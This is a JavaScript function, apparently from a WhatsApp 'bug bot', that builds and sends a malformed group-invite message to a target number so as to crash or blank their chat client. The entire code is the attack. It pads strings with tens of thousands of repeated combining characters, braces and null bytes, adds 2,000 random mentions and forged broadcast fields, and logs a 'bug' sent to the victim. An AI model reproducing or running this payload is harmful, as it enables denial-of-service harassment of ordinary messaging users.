async function XProtexBlankChatV4(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⎋ 🦠</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>🍷𞋯 -‣" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
        expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            nativeFlowMessage: {
              messageParamJson: "{".repeat(20000),
            },
            buttons: [
            {
            name: "mpm",
              buttonParamsJson: "\u0000".repeat(20000),
            },
          ],
       },
    };
      
    await sock.relayMessage(target, MSG, {
      participant: { jid: target },
      messageId: null
    });
    console.log(chalk.red(`Succes Sending Bug BlankChatV4 To ${target}`));
}